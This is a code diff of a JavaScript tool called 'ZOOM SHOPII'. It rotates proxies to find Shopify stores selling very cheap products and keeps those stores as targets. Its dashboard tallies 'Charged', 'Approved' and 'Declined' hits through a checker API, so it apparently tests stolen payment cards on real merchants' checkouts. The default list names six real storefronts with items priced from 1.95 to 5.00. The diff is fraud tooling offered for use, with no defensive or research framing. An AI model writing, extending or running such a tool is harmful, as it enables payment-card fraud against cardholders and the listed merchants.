-    if (state.proxies.length === 0) { alert('❌ No proxies available! Please add proxies first.'); return; }
+            state.sites = [...state.sites, ...aliveSites];
+            state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
+            renderSites();
+            updateStats();
+            
+            logDebug(`🌐 Added ${aliveSites.length} manual sites with products (${urls.length - aliveSites.length} skipped)`, 'info');
+            alert(`✅ ${aliveSites.length} sites added with products!\n${urls.length - aliveSites.length} sites skipped (no product).`);
+            els.manualSites.value = '';
+        });
 
-    const urls = text.split('\n').map(u => u.trim()).filter(u => u);
-    if (urls.length === 0) { alert('❌ No valid URLs found!'); return; }
-    
-    logDebug(`📝 Processing ${urls.length} manual sites...`, 'info');
-    alert(`🔄 Checking ${urls.length} sites for products...`);
-    
-    const aliveSites = [];
-    let checked = 0;
-    
-    for (const url of urls) {
-        const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
-        const result = await testSiteWithPrice(url, proxy);
-        checked++;
-        
-        if (result.status === 'alive' && result.product) {
-            aliveSites.push({
-                url: url,
-                status: 'ALIVE',
-                price: result.price.toFixed(2),
-                product: result.product,
-                gateway: result.gateway || 'Shopify Payments',
-                added: new Date().toLocaleDateString()
-            });
-            logDebug(`✅ Added site with product: ${url} - ${result.product}`, 'success');
-        } else {
-            logDebug(`❌ Skipped (no product): ${url}`, 'warning');
-        }
-        
-        if (checked % 5 === 0 || checked === urls.length) {
-            logDebug(`📊 Progress: ${checked}/${urls.length} - ${aliveSites.length} added`, 'info');
-        }
-    }
+        els.checkSitesBtn.addEventListener('click', async function() {
+            if (state.sites.length === 0) { alert('No sites to check!'); return; }
+            if (state.proxies.length === 0) { alert('❌ No proxies available!'); return; }
 
-    state.sites = [...state.sites, ...aliveSites];
-    state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
-    renderSites();
-    updateStats();
-    
-    logDebug(`🌐 Added ${aliveSites.length} manual sites with products (${urls.length - aliveSites.length} skipped)`, 'info');
-    alert(`✅ ${aliveSites.length} sites added with products!\n${urls.length - aliveSites.length} sites skipped (no product).`);
-    els.manualSites.value = '';
-});
-        
-        // 🔥 FIXED: Check sites and remove dead ones IMMEDIATELY
-      els.checkSitesBtn.addEventListener('click', async function() {
-    if (state.sites.length === 0) { alert('No sites to check!'); return; }
-    if (state.proxies.length === 0) { alert('❌ No proxies available!'); return; }
+            this.disabled = true;
+            this.textContent = '⏳ Checking...';
+            els.siteCheckProgress.style.display = 'block';
 
-    this.disabled = true;
-    this.textContent = '⏳ Checking...';
-    els.siteCheckProgress.style.display = 'block';
+            const total = state.sites.length;
+            let checked = 0, alive = 0, dead = 0;
+            const aliveSites = [];
+            
+            for (let i = 0; i < state.sites.length; i++) {
+                const site = state.sites[i];
+                const siteUrl = typeof site === 'object' ? site.url : site;
+                const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+                const result = await testSiteWithPrice(siteUrl, proxy);
+                
+                checked++;
+                
+                if (result.status === 'alive' && result.product) {
+                    alive++;
+                    aliveSites.push({
+                        url: siteUrl,
+                        status: 'ALIVE',
+                        price: result.price.toFixed(2),
+                        product: result.product,
+                        gateway: result.gateway || 'Shopify Payments',
+                        added: new Date().toLocaleDateString()
+                    });
+                    logDebug(`✅ Site ALIVE: ${siteUrl} - ${result.product}`, 'success');
+                } else {
+                    dead++;
+                    logDebug(`❌ Site DEAD or NO PRODUCT: ${siteUrl}`, 'error');
+                }
+                
+                const pct = Math.round((checked / total) * 100);
+                els.siteCheckStatus.textContent = pct + '%';
+                els.siteCheckFill.style.width = pct + '%';
+                els.siteCheckChecked.textContent = checked;
+                els.siteCheckAlive.textContent = alive;
+                els.siteCheckDead.textContent = dead;
+                els.siteCheckTotal.textContent = total;
+                await new Promise(r => setTimeout(r, 30));
+            }
 
-    const total = state.sites.length;
-    let checked = 0, alive = 0, dead = 0;
-    const aliveSites = [];
-    
-    for (let i = 0; i < state.sites.length; i++) {
-        const site = state.sites[i];
-        const siteUrl = typeof site === 'object' ? site.url : site;
-        const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
-        const result = await testSiteWithPrice(siteUrl, proxy);
-        
-        checked++;
-        
-        if (result.status === 'alive' && result.product) {
-            alive++;
-            aliveSites.push({
-                url: siteUrl,
-                status: 'ALIVE',
-                price: result.price.toFixed(2),
-                product: result.product,
-                gateway: result.gateway || 'Shopify Payments',
-                added: new Date().toLocaleDateString()
-            });
-            logDebug(`✅ Site ALIVE: ${siteUrl} - ${result.product}`, 'success');
-        } else {
-            dead++;
-            logDebug(`❌ Site DEAD or NO PRODUCT: ${siteUrl}`, 'error');
-        }
-        
-        const pct = Math.round((checked / total) * 100);
-        els.siteCheckStatus.textContent = pct + '%';
-        els.siteCheckFill.style.width = pct + '%';
-        els.siteCheckChecked.textContent = checked;
-        els.siteCheckAlive.textContent = alive;
-        els.siteCheckDead.textContent = dead;
-        els.siteCheckTotal.textContent = total;
-        await new Promise(r => setTimeout(r, 30));
-    }
+            state.sites = aliveSites;
+            renderSites();
+            updateStats();
 
-    // ✅ REPLACE with ONLY alive sites that have products
-    state.sites = aliveSites;
-    renderSites();
-    updateStats();
+            els.siteCheckStatus.textContent = '✅ Complete!';
+            els.siteCheckFill.style.width = '100%';
+            setTimeout(() => {
+                els.siteCheckProgress.style.display = 'none';
+                els.siteCheckStatus.textContent = '0%';
+                els.siteCheckFill.style.width = '0%';
+            }, 3000);
 
-    els.siteCheckStatus.textContent = '✅ Complete!';
-    els.siteCheckFill.style.width = '100%';
-    setTimeout(() => {
-        els.siteCheckProgress.style.display = 'none';
-        els.siteCheckStatus.textContent = '0%';
-        els.siteCheckFill.style.width = '0%';
-    }, 3000);
+            this.disabled = false;
+            this.textContent = '🔍 Check & Remove Dead';
+            logDebug(`✅ Site check: ${alive} alive (with products), ${dead} removed`, 'success');
+            alert(`✅ Done! ${alive} sites alive (with products), ${dead} removed.`);
+        });
 
-    this.disabled = false;
-    this.textContent = '🔍 Check & Remove Dead';
-    logDebug(`✅ Site check: ${alive} alive (with products), ${dead} removed`, 'success');
-    alert(`✅ Done! ${alive} sites alive (with products), ${dead} removed.`);
-});
         els.clearSitesBtn.addEventListener('click', function() {
             if (state.sites.length === 0) { alert('No sites to clear'); return; }
             showConfirm('⚠️ Delete All Sites', `Delete all ${state.sites.length} sites?`, function(confirmed) {
@@ -3161,14 +3208,17 @@
         // ================================================================
         loadState();
 
-        // Add default sites if none exist
+        // Add default sites if none exist - WITH PRODUCTS
         if (state.sites.length === 0) {
             state.sites = [
-                { url: 'slaterocks.com', status: 'ALIVE', price: '0.00', added: new Date().toLocaleDateString() },
-                { url: 'mlmm.de', status: 'ALIVE', price: '0.00', added: new Date().toLocaleDateString() },
-                { url: 'elgranel.com', status: 'ALIVE', price: '0.00', added: new Date().toLocaleDateString() }
+                { url: 'https://katandgracie.com', status: 'ALIVE', price: '5.00', product: 'Gift Card', added: new Date().toLocaleDateString() },
+                { url: 'https://snakeclamp.myshopify.com', status: 'ALIVE', price: '1.95', product: 'Snake Clamp', added: new Date().toLocaleDateString() },
+                { url: 'https://naturehike.com', status: 'ALIVE', price: '2.11', product: 'Camping Stove', added: new Date().toLocaleDateString() },
+                { url: 'https://megabots.com', status: 'ALIVE', price: '4.00', product: 'Robot Toy', added: new Date().toLocaleDateString() },
+                { url: 'https://unamiskincare.myshopify.com', status: 'ALIVE', price: '5.00', product: 'Face Cream', added: new Date().toLocaleDateString() },
+                { url: 'https://www.storeyfamilyfarm.com', status: 'ALIVE', price: '2.50', product: 'Farm Product', added: new Date().toLocaleDateString() }
             ];
-            logDebug('🌐 Added default test sites', 'info');
+            logDebug('🌐 Added default sites with products', 'info');
         }
 
         // Add default proxy if none exist
@@ -3188,27 +3238,26 @@
         renderFullHitsList();
         updateStats();
 
-        logDebug('🚀 ZOOM SHOPII ULTRA FAST v3.0 FIXED!', 'success');
+        logDebug('🚀 ZOOM SHOPII - AutoShopify API INTEGRATED!', 'success');
         logDebug(`📡 API: ${CONFIG.API_SERVERS[0]}`, 'info');
         logDebug(`🔑 API Key: ${CONFIG.CHECKER_API_KEY}`, 'info');
-        logDebug(`🔌 Default Proxy: ${CONFIG.DEFAULT_PROXY.substring(0, 30)}...`, 'info');
-        logDebug(`✅ Fixed: site.startsWith error handled`, 'success');
+        logDebug(`🔌 Default Proxy: ${CONFIG.DEFAULT_PROXY}`, 'info');
+        logDebug(`✅ Sites now require PRODUCT to be added`, 'success');
         logDebug(`✅ Dashboard Total = Charged + Approved`, 'success');
         logDebug(`✅ Declined removed from Dashboard`, 'success');
-        logDebug(`✅ Sites removed IMMEDIATELY during check`, 'success');
+        logDebug(`✅ AutoShopify API fully integrated`, 'success');
 
         // Show debug by default
         toggleDebug();
 
-        console.log('🚀 ZOOM SHOPII ULTRA FAST v3.0 FIXED');
+        console.log('🚀 ZOOM SHOPII - AutoShopify API INTEGRATED!');
+        console.log('📡 API:', CONFIG.API_SERVERS[0]);
+        console.log('🔑 Key:', CONFIG.CHECKER_API_KEY);
         console.log('📊 State:', state);
         console.log('🌐 Sites:', state.sites.length);
         console.log('🔌 Proxies:', state.proxies.length);
         console.log('🎯 Hits:', state.hits.length);
-        console.log('✅ site.startsWith FIXED!');
-        console.log('✅ Dashboard Total = Charged + Approved');
-        console.log('✅ Declined removed from Dashboard');
-        console.log('✅ Sites removed IMMEDIATELY during check');
+        console.log('✅ AutoShopify API fully integrated');
     </script>
 
 </body>
